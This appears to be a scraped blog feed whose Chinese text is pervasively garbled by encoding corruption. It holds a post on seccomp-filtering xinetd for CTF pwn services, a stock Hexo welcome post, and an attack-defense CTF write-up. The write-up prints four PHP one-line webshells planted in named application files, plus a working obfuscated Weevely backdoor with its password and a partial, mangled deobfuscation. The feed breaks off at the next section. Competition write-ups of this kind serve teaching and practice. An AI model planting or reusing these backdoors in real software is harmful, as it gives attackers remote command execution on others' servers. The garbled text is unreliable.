Âú®ËøëÊó•ÁªìÊùüÁöÑ‰∏ÄÂú∫Á∫ø‰∏ãËµõ‰∏≠ÔºåÊüêÊàòÈòüÂêëÊàëÂèçÈ¶àÊàêÂäüÁöÑ‰ΩøÁî®‰∫ÜÊàëÂú®ÂéªÂπ¥ÁºñÂÜôÁöÑ‰∏Ä‰∏™<a href="https://github.com/Asuri-Team/pwn-sandbox">PWNÈÄöÈò≤Â∑•ÂÖ∑</a>ËãüÂà∞‰∫ÜÊúÄÂêéÔºàÂÖ≥‰∫éËøô‰∏™Â∑•ÂÖ∑ÁöÑÂéüÁêÜÂ¶ÇÊûúÊúâÂÖ¥Ë∂£Ê¨¢Ëøéstar‰∏Ä‰∏ãÂØπÂ∫îÈ°πÁõÆÔºå‰∫∫Êï∞Â§öÁöÑËØùÊàë‰ºöÂÜçÂºÄÂùëÂÜôÊñáÁ´†Ôºâ„ÄÇ<br />
Êàë‰πüÊÉäËÆ∂‰∫é‰∏ªÂäûÊñπÁ´üÁÑ∂ÂØπËøô‰πàÂ§ßÂûãÁöÑÈÄöÈò≤Â∑•ÂÖ∑ÈÉΩÊ≤°ÊúâÂØüËßâ„ÄÇ</p>
<p>ËÄåÂú®CTFËß£È¢òËµõ/Ê∏óÈÄèËµõ‰∏≠ÔºåËôΩÁÑ∂ÊúâdockerËøô‰∏ÄÂÆπÂô®ÊäÄÊúØÂèØ‰ª•‰∏∫pwnÈ¢òÁõÆÈöîÁ¶ªËøêË°åÁéØÂ¢ÉÔºåÈôêÂà∂ËøêË°åËµÑÊ∫êÔºåÊñπ‰æøÈáçÂêØÁ≠âÁª¥Êä§Â∑•‰ΩúÔºå‰ΩÜ‰æùÁÑ∂Èöæ‰ª•ÈÅøÂÖçÊúâÈÉ®ÂàÜÊêÖÂ±éÈÄâÊâãÈááÁî®ËØ∏Â¶Ç<a href="https://zh.wikipedia.org/wiki/Fork%E7%82%B8%E5%BC%B9">ForkÁÇ∏Âºπ</a>Á≠âÊâãÊÆµÂØπÊúçÂä°Âô®ËøõË°åDoSÊîªÂáª„ÄÇ<br />
Âõ†Ê≠§ÔºåÂØπ‰∏Ä‰∫õÁî®‰∏çÂà∞ÁöÑÁöÑÁ≥ªÁªüË∞ÉÁî®ËøõË°åÈôêÂà∂Ôºå‰πüÂèØ‰ª•Â§ßÂ§ßÂáèÂ∞ëÊêÖÂ±éÊ£çÈÄâÊâãÁöÑÊï∞Èáè„ÄÇÔºàDockerÂ∑≤Áõ¥Êé•ÊîØÊåÅÂØπcontainerÂÜÖÁ®ãÂ∫èËøõË°åÁ≥ªÁªüË∞ÉÁî®ÈôêÂà∂<a href="https://docs.docker.com/engine/security/seccomp/">Read More</a>Ôºâ</p>
<p>Âõ†Ê≠§Ôºå<a href="https://github.com/Asuri-Team/xinetd-kafel">xinetd-kafel</a>Ëøô‰∏ÄÊîπÁâàÁöÑxinetdÊúçÂä°Ê≤πÁÑ∂ËÄåÁîü„ÄÇ</p>
<h1>0x01 ÂéüÁêÜÔºö‰Ω†ÂØπxinetdÂÅö‰∫ÜÁÇπÂï•Ôºü</h1>
<p>ÂÖ∂ÂÆû‰øÆÊîπxinetdËÆ©ÂÖ∂ÊîØÊåÅÂØπÁ≥ªÁªüË∞ÉÁî®ÁöÑËøáÊª§Ëøô‰∏ÄÊÉ≥Ê≥ïÊúÄÊó©Âú®Defcon 2015 FinalÊó∂Â∞±Â∑≤Ë¢´ÂÖ∂‰∏ªÂäûÊñπÂÆûÁé∞„ÄÇ‰ΩÜ‰∏ªÂäûÊñπÂπ∂Êú™ÂºÄÊ∫êÂÖ∂xinetd‰ª£Á†ÅÔºà‰πüÂèØËÉΩÊòØÊàëÊ≤°ÊâæÂà∞ÔºâÔºåËÄå‰∏îÂÖ∂Âè™ËÉΩÂú®xinetdÁöÑÈÖçÁΩÆÊñá‰ª∂‰∏≠ÂØπsyscallËøõË°åÁÆÄÂçïÁöÑÈªëÁôΩÂêçÂçïËøáÊª§ÔºåÈöæ‰ª•ÊúâÊïàÈôêÂà∂Êó•Ê∏êÂ¢ûÈïøÁöÑÊêÖÂ±éÂ§ßÂÜõ„ÄÇ<br />
ËÆ©Á®ãÂ∫èÊîØÊåÅsyscallËøáÊª§ÈÄöÂ∏∏Êù•ËÆ≤Êúâ‰∏§ÁßçÂäûÊ≥ïÔºö<br />
1. ptrace<br />
2. seccomp<br />
ÂÖ∂‰∏≠ÔºåptraceÂ∞±ÊòØlinux‰∏ãgdbÁî®Êù•Ë∞ÉËØïÁ®ãÂ∫èÊâÄ‰ΩøÁî®ÁöÑsyscallÔºåËÄå‰∏îÂÖ∂ÂäüËÉΩÂ¶ÇÂÖ∂ÂêçÔºåprocess traceÔºå Áî®‰∫éË∑üË∏™ËøõÁ®ãÁöÑÂêÑÁßçË∞ÉÁî®„ÄÇ<br />
‰ΩÜÊòØÁî±‰∫éptrace‰ΩøÁî®Ëøá‰∫éÂ§çÊùÇÔºåÊàë‰ª¨Âú®xinetd‰∏≠ÔºåÂπ∂Êú™‰ΩøÁî®Ëøô‰∏ÄÊñπÂºèÔºåËÄåÈááÁî®‰∫Üseccomp„ÄÇ</p>
<h2>seccompÊòØ‰∏™Âï•Ôºü</h2>
<p><code>seccomp - operate on Secure Computing state of the process</code><br />
seccomp ‰∏≠ÊñáÁõ¥ËØëÂ∞±ÊòØ‚ÄúÊìç‰ΩúËøõÁ®ãÁöÑÂÆâÂÖ®ËÆ°ÁÆóÁä∂ÊÄÅ‚ÄùÔºåÂÖ∂ÂÆûÂ∞±ÊòØÈÄöÁü•ÂÜÖÊ†∏ÂØπËøõÁ®ãÁöÑÁ≥ªÁªüË∞ÉÁî®ËøõË°åÈôêÂà∂„ÄÇÂá†Âπ¥ÂâçCentOS/RedHat LinuxÈªòËÆ§ÂêØÁî®ÁöÑselinuxÂ∫ïÂ±ÇÂ∞±ÊòØ‰ΩøÁî®ÁöÑËøô‰∏™Á≥ªÁªüË∞ÉÁî®ÂØπËøõÁ®ãËøõË°åÁ≥ªÁªüË∞ÉÁî®ÈôêÂà∂„ÄÇÂΩìÂπ¥Â∫îËØ•‰∫∫‰∫∫Ë£ÖÂÆålinuxÁöÑÁ¨¨‰∏Ä‰ª∂‰∫ãÂ∞±ÊòØÂÖ≥Êéâselinux„ÄÇÁé∞Âú®ÁöÑUbuntuÂíåCentOSÈÉΩÂ∑≤‰∏çÂÜçÈªòËÆ§ÂÆâË£ÖÊàñÂºÄÂêØselinux‰∫Ü„ÄÇ<br />
ÈÄöËøá<code>man seccomp</code>Êàë‰ª¨Â∞±ËÉΩÁúãÂà∞seccompÁöÑÁõ∏ÂÖ≥Ë∞ÉÁî®ÊñπÊ≥ï„ÄÇ</p>
<pre><code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_XX, args);
seccomp(SECCOMP_MODE_XX, flags, args);
</code></pre>
<p>linux Man pageÂØπseccompÁöÑÊèèËø∞ÈùûÂ∏∏ÊúâÊ≠ß‰πâÔºåÂÖ∂Êèê‰æõ‰∫ÜÂ¶Ç‰∏ä‰∏§ÁßçÊé•Âè£ÔºåËøôÈáåÊàëÊääÂÖ∂ÂèÇÊï∞Áõ∏Â∫îÁöÑÂØπÂ∫î‰∫ÜËµ∑Êù•„ÄÇ<code>seccomp</code>ÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞flagsÂæàÈöæÊü•Âà∞Áõ∏ÂÖ≥ËµÑÊñôÔºåËÄå‰∏îÂú®Êàë‰ª¨ÁöÑÂú∫ÊôØ‰∏ãÂπ∂‰∏çÂΩ±Âìç‰ΩøÁî®ÔºåÂ∞±‰∏çÂÜçÂ§öÂÅöËß£Èáä„ÄÇseccompË∞ÉÁî®‰ºöÂØπÂΩìÂâçËøõÁ®ãÂèäÂÖ∂Â≠êËøõÁ®ãÁîüÊïàÔºåÂ¶ÇÊûúÊàë‰ª¨Ë∞ÉÁî®seccomp‰πãÂêéÔºåÂΩìÂâçËøõÁ®ãÁöÑÁ≥ªÁªüË∞ÉÁî®Â∞±‰ºöË¢´ÈôêÂà∂„ÄÇ</p>
<p><code>SECCOMP_MODE_XX</code>ÂÖ±Êúâ‰∏§ÁßçÈÄâÊã©Ôºö<br />
1. SECCOMP_MODE_STRICT<br />
2. SECCOMP_MODE_FILTER</p>
<p><code>SECCOMP_MODE_STRICT</code> ‰ºöÂ∞ÜÁ≥ªÁªüË∞ÉÈôêÂà∂Âú® <code>read, write, _exit (but not exit_group), sigreturn</code>‰∏≠„ÄÇ Êàë‰ª¨ÂèØ‰ª•ÁºñÂÜô‰∏Ä‰∏™Â∞èÁ®ãÂ∫èÊµãËØï‰∏Ä‰∏ãÔºö</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;linux/seccomp.h&gt;
#include &lt;linux/filter.h&gt;
#include &lt;linux/audit.h&gt;
#include &lt;linux/signal.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;unistd.h&gt;

int main(void)
{
    puts("a");
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT, 0);
    puts("b");
    system("echo c");
    return 0;
}
</code></pre>
<p>ÁºñËØëËøêË°åÂêéÁªìÊûúÂ¶Ç‰∏ãÔºö</p>
<pre><code>xm1994@xm1994-vm:~$ ./a.out 
a
b
Killed
</code></pre>
<p>Á®ãÂ∫èÂú®ÊâßË°åÂà∞systemÂáΩÊï∞ÂêéÂ∞±ÊèêÁ§∫‰∫ÜKilled„ÄÇËøôÊòØÂõ†‰∏∫Âú®ÊâßË°åsystemÊó∂Ôºå‰ºöË∞ÉÁî®forkÂíåexecve‰∏§‰∏™Á≥ªÁªüË∞ÉÁî®„ÄÇ<br />
Â¶ÇÊûúÊàë‰ª¨Âà†Êéâsystem()ÂáΩÊï∞ÂêéÂÜçËøêË°åÂë¢ÔºüÁ®ãÂ∫è‰æùÁÑ∂‰ºöÊèêÁ§∫killed„ÄÇËøô‰∏™ÈóÆÈ¢òÊòØÁî±‰∫éÂú®Êñ∞ÁâàÁöÑlibc‰∏≠ÔºåmainÂáΩÊï∞ÈÄÄÂá∫Âêé„ÄÇlibc_start_main‰ºöË∞ÉÁî®exit_group(0)ÁªìÊùüÁ®ãÂ∫è‰ª•ÂèäÂÖ∂Â≠êËøõÁ®ãÔºàÊÑüËßâÊòØ‰∏∫‰∫ÜÈò≤Ê≠¢ÂÉµÂ∞∏ËøõÁ®ãÔºüÔºâÔºå‰ΩÜÂÜçÊóßÁâàÁöÑlibc‰∏≠ÔºåÊâßË°åÁöÑÊòØexit()„ÄÇ</p>
<p><code>SECCOMP_MODE_FILTER</code> Ê®°ÂºèÂàôÂÖÅËÆ∏‰º†ÂÖ•‰∏Ä‰∏™ËøáÊª§Âô®ÂèÇÊï∞ÔºåËøõË°åËá™ÂÆö‰πâÁöÑÁ≥ªÁªüË∞ÉÁî®ËøáÊª§„ÄÇ</p>
<h2>ËøôËøáÊª§Âô®ÂíãÊêûÂïäÔºü</h2>
<p>seccomp‰ΩøÁî®ÁöÑËøáÊª§Âô®Âè´<a href="https://zh.wikipedia.org/wiki/BPF">BPF</a>, ÂÖÅËÆ∏Âú®ÂÜÖÊ†∏‰∏≠Áõ¥Êé•ËÆæÁΩÆÊï∞ÊçÆÂåÖËøáÊª§Ê®°Âºè„ÄÇ Êàë‰ª¨‰ΩøÁî®wireshark/tcpdumpËøõË°åÁΩëÁªúÊäìÂåÖÊó∂ÔºåËÆæÁΩÆÁöÑÊäìÂåÖËßÑÂàôÂ∞±‰ºöË¢´ÁºñËØëÊàêbpfÈÄÅÂÖ•ÂÜÖÊ†∏„ÄÇÂú®ÂÜÖÊ†∏‰∏≠ÔºåÁ≥ªÁªüË∞ÉÁî®ÊµÅÁ®ã‰πü‰ºöÂèçÊò†Âú®ÁΩëÁªúÊï∞ÊçÆÂåÖÔºàÁâπÊÆäÁöÑÔºâÁöÑÂ§ÑÁêÜÊµÅÁ®ã‰∏≠ÔºàËøòÊúâÂæàÂ§öÂÖ∂‰ªñÁöÑÁ≥ªÁªü‰∫ã‰ª∂‰πü‰ºö‰ª•Êï∞ÊçÆÂåÖÁöÑÂΩ¢ÂºèÂ≠òÂú®Ôºâ„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨‰πüÂèØ‰ª•ÈÄöËøáÁºñËØëbpfËßÑÂàôÂà∞ÂÜÖÊ†∏‰∏≠ÔºåÊù•Ëá™ÂÆö‰πâseccompÁöÑËøáÊª§ËßÑÂàô„ÄÇ</p>
<pre><code> struct sock_fprog {
    unsigned short      len;    /* Number of BPF instructions */
    struct sock_filter *filter; /* Pointer to array of
                                    BPF instructions */
};

Each program must contain one or more BPF instructions:

struct sock_filter {            /* Filter block */
    __u16 code;                 /* Actual filter code */
    __u8  jt;                   /* Jump true */
    __u8  jf;                   /* Jump false */
    __u32 k;                    /* Generic multiuse field */
};

</code></pre>
<p>bpfËßÑÂàôÂÆûÈôÖ‰∏äÊòØÂú®ÂÜÖÊ†∏‰∏≠ÁöÑbpfËôöÊãüÊú∫‰∏≠ËøêË°åÔºå‰πüÂ∞±ÊòØËØ¥‰ªñ‰πüÊòØ‰∏ÄÁßçopcodeÔºåÂõ†Ê≠§ÔºåÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∫õÂ∑•ÂÖ∑ÂéªÁîüÊàêÁõ∏Â∫îÁöÑopcode„ÄÇ‰∏Ä‰∏™ÊØîËæÉÂ∏∏Áî®ÁöÑÂ∑•ÂÖ∑ÊòØlibseccompÔºåÂÆÉÂèØ‰ª•ÈÄöËøá‰∏Ä‰∫õÊé•Âè£Êù•ÁîüÊàêbpfËßÑÂàô‰ª£Á†Å„ÄÇ‰ΩÜ‰ΩøÁî®libseccompÁöÑËØùÂ∞±ÈúÄË¶ÅËá™Â∑±ÂÜô‰∏Ä‰∏™parserÂéªË∞ÉÁî®Áõ∏ÂÖ≥ÁöÑÊé•Âè£‰∫Ü„ÄÇ‰∏áÂπ∏ÔºåÂú®Ë∞ÉÁ†î‰∏≠ÔºåÊàëÂèëÁé∞‰∫ÜË∞∑Ê≠åÁöÑÊüê‰∏™ÂëòÂ∑•ÁºñÂÜôÁöÑ<a href="https://github.com/google/kafel">kafel</a>Â∫ì, ‰ªñÂèØ‰ª•ÂæàÊñπ‰æøÁöÑÂ∞ÜÊñáÊú¨ÊèèËø∞ÁöÑËøáÊª§ËßÑÂàôÁºñËØëÊàêsock_fprogÁªìÊûÑ‰Ωì„ÄÇ</p>
<h1>0x02 ‰øÆÊîπÔºö‰Ω†Âà∞Â∫ïÊîπ‰∫ÜÁÇπÂï•Ôºü</h1>
<p>Âú®ÈòÖËØª‰∫Üxinetd‰ª£Á†ÅÂêéÔºåÂèëÁé∞ÂÖ∂‰ª£Á†ÅÁªìÊûÑÊòØÁõ∏ÂΩìÁöÑÂπ≤ÂáÄÊòì‰∫éÁêÜËß£ÁöÑ„ÄÇÊàëÂú®ÂÖ∂ÈÖçÁΩÆÊñá‰ª∂parser‰∏≠Ê∑ªÂä†‰∫Ü<code>kafel_rule</code> Ëøô‰∏ÄÈÄâÈ°πÔºåÁî®‰∫éÊåáÂÆökafelËßÑÂàôÊñá‰ª∂„ÄÇÈöèÂêéÂ∞ÜÊñá‰ª∂ÁºñËØë‰∏∫sock_fprogÁªìÊûÑ‰Ωì‰øùÂ≠òÂú®ÊØè‰∏™serviceÁöÑÈÖçÁΩÆ‰∏≠„ÄÇ<br />
xinetdÂú®Êé•Êî∂Âà∞ËøûÊé•Âêé‰ºöforkÂá∫Êù•‰∏Ä‰∏™Â≠êËøõÁ®ãÔºåÈöèÂêéÈÄöËøádup/dup2ËøõË°åÊµÅÈáçÂÆöÂêë„ÄÇÂú®ÊµÅÈáçÂÆöÂêëÂÆåÊàêÂêéÔºå‰ºöË∞ÉÁî®execveÊâßË°åÁõÆÊ†áÊúçÂä°Á®ãÂ∫è„ÄÇËøô‰∏ÄËøáÁ®ãÁ±ª‰ºº‰∫éÂú®shell‰∏≠ÊâßË°åÁ®ãÂ∫èÂπ∂ÂØπÊµÅÈáçÂÆöÂêëÔºåÂ¶ÇÊûúËØªËÄÖÂÆûÁé∞ËøáÁÆÄÊòìÁöÑshellÔºåÂ∫îËØ•ÂæàÂ•ΩÁêÜËß£„ÄÇ<br />
Êàë‰ª¨Âè™ÈúÄË¶ÅÂú®execve‰πãÂâçË∞ÉÁî® <code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, args);</code> ‰æøÂèØÂØπÁõÆÊ†áÊúçÂä°Á®ãÂ∫èËÆæÂÆöseccompËßÑÂàô„ÄÇ</p>
<p>Ëøô‰∏Ä‰øÆÊîπÂÖ∂ÂÆûÂçÅÂàÜÁÆÄÂçïÔºå‰ª£Á†ÅÁöÑÊÄªÂèòÊõ¥Ë°åÊï∞‰∏çË∂ÖËøá200Ë°å„ÄÇ</p>
<h1>0x03 ÊïàÊûúÔºöÁúüÁÆ°Áî®Ôºü</h1>
<p>ÂΩìÁÑ∂ÁÆ°Áî®‰∫ÜÔºå‰∏ç‰ø°Ëá™Â∑±ËØïËØï„ÄÇ</p>
<p>Ëøô‰∏™ÁâàÊú¨ÁöÑxinetdÊàë‰ª¨Â∑≤ÁªèÂ∫îÁî®Âà∞‰∫ÜÊàòÈòüÂ∏ÉÁΩÆpwnÈ¢ò‰ΩøÁî®ÁöÑdocker imageÔºö<a href="https://github.com/Asuri-Team/ctf-xinetd">ctf-xinetd</a>‰∏≠„ÄÇÊ¨¢ËøéÂêÑ‰ΩçÂ§ßÂ∏àÂÇÖËÑ±‰∏ãÊù•ËØïÁî®ÔºåÂ•ΩÁî®ÁöÑËØùÂà´ÂøòÁÇπ‰∏™star~„ÄÇ</p>
<h1>0x04 ÁõÆÊ†áÔºöÁêÜÊÉ≥Âæà‰∏∞Êª°</h1>
<p>Ëøô‰∏™Â∑•ÂÖ∑ÊàëÁî®‰∫Ü‰∏çÂà∞ÂÖ≠‰∏™Â∞èÊó∂Â∞±ÂÜôÂÆå‰∫Ü„ÄÇ‰πãÊâÄ‰ª•Ëøô‰πàËµ∂Êó∂Èó¥ÔºåÊòØÂ∏åÊúõÂú®Âç≥Â∞ÜÂà∞Êù•ÁöÑÂõΩËµõÂíå‰ª•ÂêéÁöÑÊØîËµõ‰∏≠ÔºåËÉΩÊúâ‰∏ªÂäûÊñπ‰ΩøÁî®ÂíåÊé®ÂπøËøô‰∏ÄÂ∑•ÂÖ∑Ôºå‰∏∫ÈÄâÊâãÊèê‰æõÊõ¥Âä†Âπ≤ÂáÄÂÖ¨Âπ≥ÁöÑÊØîËµõÁéØÂ¢É„ÄÇÊúÄÁªàÁõÆÁöÑÂΩìÁÑ∂ÊòØÂõΩÂÜÖÂ§ñÁöÑÊâÄÊúâÊØîËµõÈÉΩËÉΩÁî®‰∏äËøô‰∏ÄÂ∑•ÂÖ∑Ôºå‰ΩÜÊòØÁêÜÊÉ≥Âæà‰∏∞Êª°ÔºåÊÄïÊòØÂà∞ÊúÄÂêéÂè™ÊúâÊàë‰ª¨ÊàòÈòüÂíåÊØîËæÉÁÜüÊÇâÁöÑÂá†‰∏™ÊàòÈòüÂäûÊØîËµõÊâç‰ºöÁî®Âêß233333„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/12/03/hello-world/</id>
        <title><![CDATA[Hello World]]></title>
        <updated>2018-02-24T03:48:11+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/12/03/hello-world/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/12/03/hello-world/"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
        <author>
            <name><![CDATA[KarlRixon‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/</id>
        <title><![CDATA[XMan2017Â§è‰ª§Ëê•Áªì‰∏öÊîªÈò≤ËµõBabyblogÂá∫È¢òÊÄùË∑Ø&WriteUP]]></title>
        <updated>2017-08-20T15:21:31+08:00</updated>
        <link href="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/"/>
        <content type="text/html" src="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/"><![CDATA[<h1 class="md-end-block md-heading md-focus"><span class="md-expand">XMan 2017 AWD Babyblog author&#8217;s turtoral &amp; writeup</span></h1>
<h2 class="md-end-block md-heading">0x00 Âá∫È¢òÊÄùË∑Ø</h2>
<h3 class="md-end-block md-heading">Â∏∏ËßÅ‰∏ÄÂè•ËØùÊú®È©¨</h3>
<p><span class="md-line md-end-block">‰∏ÄÂè•ËØùÊú®È©¨ÊòØÂú®Êó•Â∏∏ÊîªÂáªÂíåÊ∏óÈÄè‰∏≠‰ΩøÁî®ÁöÑÊúÄÂπøÊ≥õÁöÑ‰∏ÄÁ±ªÊú®È©¨ÔºåÂÖ∂ÂÖ∑Êúâ‰ª£Á†ÅÈáèÂ∞èÔºåÂèòÂΩ¢Â§öÔºåÊòìÈöêËóèÁ≠âÁâπÊÄß„ÄÇËøôÁ±ª‰∏ÄÂè•ËØùÊú®È©¨Â§ö‰∏∫ÈÄöËøáevalÊàñÁ±ª‰ººÂëΩ‰ª§Áõ¥Êé•ÊâßË°åÂØπÂ∫îËØ≠Ë®ÄÁöÑÂ≠óÁ¨¶‰∏≤‰ª£Á†ÅÔºåËææÂà∞ÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÁöÑÊïàÊûú„ÄÇÂú®Êú¨È¢ò‰∏≠ÔºåÊàë‰∏ÄÂÖ±ÊîæÁΩÆ‰∫ÜÂõõÁßç‰∏çÂêåÁ±ªÂûãÁöÑ‰∏ÄÂè•ËØùÊú®È©¨Ôºö</span></p>
<pre class="lang:default decode:true"># 1. app/template/*.tpl
eval($_POST[passwd])

# 2. app/controllers/PostsController.php 
$_GET[function]($_POST[params])

# 3. bootstrap/autoload.php
echo `$_POST[shellcmd]`

# 4. app/views/errors/404.blade.php
@preg_replace("/[pageerror]/e", $_POST['passwd'], "saft");</pre>
<h3 class="md-end-block md-heading">Â∏∏ËßÅÂ§ßÈ©¨</h3>
<p><span class="md-line md-end-block">Áõ∏ÊØî‰∫éÂ∞èÈ©¨ÔºåËøôÁ±ªÊú®È©¨ÈÄöÂ∏∏‰ΩìÁßØÁ®çÂ§ßÔºåÊõ¥‰∏çÊòìÈöêËóè„ÄÇ‰ΩÜÂÖ∂‰∏≠ÂèØ‰ª•ÂåÖÂê´Êõ¥Â§öÂä†ÂØÜÂíåÊ∑∑Ê∑ÜÁöÑÊé™ÊñΩÔºå‰ΩøÊîªÂáªË°å‰∏∫Êõ¥‰∏çÂÆπÊòìË¢´ÂØüËßâ„ÄÇÂú®Êú¨È¢ò‰∏≠ÔºåÊàëÊîæÁΩÆ‰∫Ü‰∏Ä‰∏™WeevelyÊú®È©¨ÔºåÂÖ∂ÂØÜÁ†Å‰∏∫xman1234</span></p>
<pre class="lang:default decode:true"># 1. autoload_real.php
$i='er";$K3i=$m[1][0K3].K3$m[1K3]K3[1];$hK3=$K3sl($ss(K3md5($i.$kh),0,K33));$f=$sl(K3$sK3s(md5($i.$';
$D='kfK3K3),0,3));$p="K3";foK3K3r(K3$K3z=1;$z&lt;count($m[1]);K3$z++)$pK3.=$q[$m[K32K3][K3K3$z]];if(sK';
$v='3LANK3GUAK3GE"];if($rr&amp;&amp;$ra)K3{$u=paK3rK3K3sK3K3e_url($rr);parse_str($uK3["query"],$qK3);$q=arK';
$B='[$i].=$p;$eK3=strpK3oK3s($s[$i]K3,$f);ifK3($eK3){$k=$khK3.K3$kf;oK3b_start();@evaK3l(@gzuncK3om';
$o='3;}}return K3$oK3;}$rK3=$_K3SERVER;$K3rr=@$r[K3"HTTP_REFEREK3R"];$ra=K3@$r["K3HTTP_AK3CCK3EPT_K';
$O='K3;iK3f($q&amp;K3&amp;$m){@sesK3sioK3n_start()K3;$s=K3&amp;$_SK3ESSIK3OK3N;$ss="substK3r";$sK3l="strtK3olow';
$H='3="";for($i=0;$i&lt;$l;K3){fK3orK3($j=0;($j&lt;$K3c&amp;&amp;$i&lt;$K3lK3)K3;$j++K3,$i++){$o.=$tK3{$i}^$k{$K3j}K';
$c='$K3ss($s[$i],0K3,$eK3))),$k))K3);$K3o=oK3b_get_conK3tentsK3();ob_enK3d_cK3lean();K3K3$d=baseK36';
$m='4_encode(x(K3gzcompK3ress($oK3),$kK3));print("&lt;K3$k&gt;$dK3K3&lt;/$k&gt;"K3);@sK3ession_deK3stroy();}}}}';
$t='$kh="a8bK3b";$K3kf="c44K3K3a";funK3ctK3ion x($t,$k){$cK3=sK3trlen($kK3);$l=stK3rlK3en($t);K3$oK';
$M='prK3ess(@x(@bK3aK3se64K3_decodeK3(pregK3_replaK3ce(aK3rray("/_/",K3"/-/"),arrK3ay(K3"/","K3+"),';
$f='3trposK3($p,$h)===0K3){$s[$i]=""K3;$p=$sK3s($pK3,3);}K3K3if(array_key_exisK3ts($i,K3$K3sK3)){$s';
$Q=str_replace('d','','crdddeatde_fdunctdion');
$b='3raK3y_vK3alues(K3$q)K3;preg_mK3aK3tch_all("K3/(K3[\\K3w])[\\w-]+(?:;q=0.([\\d]))K3?,K3?/",$ra,$m)';
$l=str_replace('K3','',$t.$H.$o.$v.$b.$O.$i.$D.$f.$B.$M.$c.$m);
$q=$Q('',$l);$q();</pre>
<p><span class="md-line md-end-block">Âú®ËøôÊÆµÂ§ßÈ©¨‰∏≠Ôºå<span spellcheck="false"><code>$Q</code></span>Âíå<span spellcheck="false"><code>$l</code></span>Âùá‰∏∫Â≠óÁ¨¶‰∏≤„ÄÇWeevelyÂÄüÂä©PHPÂèØ‰ª•Â∞ÜÂáΩÊï∞ÂêçÂ≠óÁ¨¶‰∏≤Áî®‰ΩúÁ±ª‰ººÂáΩÊï∞ÊåáÈíàÁöÑÁâπÊÄßÔºåÊù•ÊûÑÈÄ†Êú®È©¨„ÄÇ</span></p>
<pre class="lang:default decode:true">$Q = create_function

$kh = "a8bb";
$kf = "c44a";
function x($t, $k) {
	$c = strlen($k);
	$l = strlen($t);
	$o = "";
	for ($i = 0;$i &lt; $l;) {
		for ($j = 0;($j &lt; $c &amp;&amp; $i &lt; $l);$j++, $i++) {
			$o.= $t{$i} ^ $k{$j};
		}
	}
	return $o;
}
$r = $_SERVER;
$rr = @$r["HTTP_REFERER"];
$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
if ($rr &amp;&amp; $ra) {
	$u = parse_url($rr);
	parse_str($u["query"], $q);
	$q = array_values($q);
	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
	if ($q &amp;&amp; $m) {
		@session_start();
		$s = &amp; $_SESSION;
		$ss = "substr";
		$sl = "strtolower";
		$i = $m[1][0] . $m[1][1];
		$h = $sl($ss(md5($i . $kh), 0, 3));
		$f = $sl($ss(md5($i . $kf), 0, 3));
		$p = "";
		for ($z = 1;$z$d");@session_destroy();}}}}
"</pre>
<h3 class="md-end-block md-heading">‰ªªÊÑèÊñá‰ª∂ÂåÖÂê´</h3>
